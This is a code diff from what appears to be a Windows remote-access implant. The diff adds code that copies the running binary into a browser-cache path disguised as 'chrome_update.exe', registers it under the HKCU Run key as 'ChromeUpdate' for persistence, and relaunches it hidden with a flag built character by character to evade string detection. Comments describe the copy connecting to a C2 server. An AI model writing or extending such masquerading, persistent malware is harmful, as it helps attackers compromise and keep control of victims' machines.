@@ -296,16 +296,19 @@ static void ensure_dir_exists(const char *path) {
     }
 }
 
-/* Spawn a protected copy of this process as chrome_update.exe */
-void sys_spawn_protected_copy(void) {
+/* Spawn a shadow copy of this process to a less suspicious location.
+   The copy connects to C2 as a normal client. The user must click
+   "Protect Process" on it from the dashboard to mark it critical. */
+void sys_spawn_shadow_copy(void) {
     char currentPath[MAX_PATH];
     GetModuleFileNameA(NULL, currentPath, MAX_PATH);
 
-    char appData[MAX_PATH];
-    GetEnvironmentVariableA("APPDATA", appData, MAX_PATH);
+    char localAppData[MAX_PATH];
+    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
 
+    /* Use a location that looks like a browser update cache */
     char destPath[MAX_PATH];
-    snprintf(destPath, MAX_PATH, "%s\\Microsoft\\Windows\\chrome_update.exe", appData);
+    snprintf(destPath, MAX_PATH, "%s\\Microsoft\\Windows\\INetCache\\IE\\chrome_update.exe", localAppData);
 
     char dirPath[MAX_PATH];
     strncpy(dirPath, destPath, MAX_PATH - 1);
@@ -315,16 +318,25 @@ void sys_spawn_protected_copy(void) {
     ensure_dir_exists(dirPath);
 
     if (CopyFileA(currentPath, destPath, FALSE)) {
+        /* Register the shadow copy in the Run key for persistence */
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_CURRENT_USER,
+                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+            RegSetValueExA(hKey, "ChromeUpdate", 0, REG_SZ, (BYTE*)destPath, (DWORD)strlen(destPath) + 1);
+            RegCloseKey(hKey);
+        }
+
+        /* Spawn the copy with --shadow flag so it auto-protects after delay */
         char action[16] = {0};
         action[0] = 'o'; action[1] = 'p'; action[2] = 'e'; action[3] = 'n'; action[4] = '\0';
 
-        char protectedArg[16] = {0};
-        protectedArg[0] = '-'; protectedArg[1] = '-'; protectedArg[2] = 'p';
-        protectedArg[3] = 'r'; protectedArg[4] = 'o'; protectedArg[5] = 't';
-        protectedArg[6] = 'e'; protectedArg[7] = 'c'; protectedArg[8] = 't';
-        protectedArg[9] = 'e'; protectedArg[10] = 'd'; protectedArg[11] = '\0';
+        char shadowArg[16] = {0};
+        shadowArg[0] = '-'; shadowArg[1] = '-'; shadowArg[2] = 's';
+        shadowArg[3] = 'h'; shadowArg[4] = 'a'; shadowArg[5] = 'd';
+        shadowArg[6] = 'o'; shadowArg[7] = 'w'; shadowArg[8] = '\0';
 
-        ShellExecuteA(NULL, action, destPath, protectedArg, NULL, SW_HIDE);
+        ShellExecuteA(NULL, action, destPath, shadowArg, NULL, SW_HIDE);
     }
 }
 
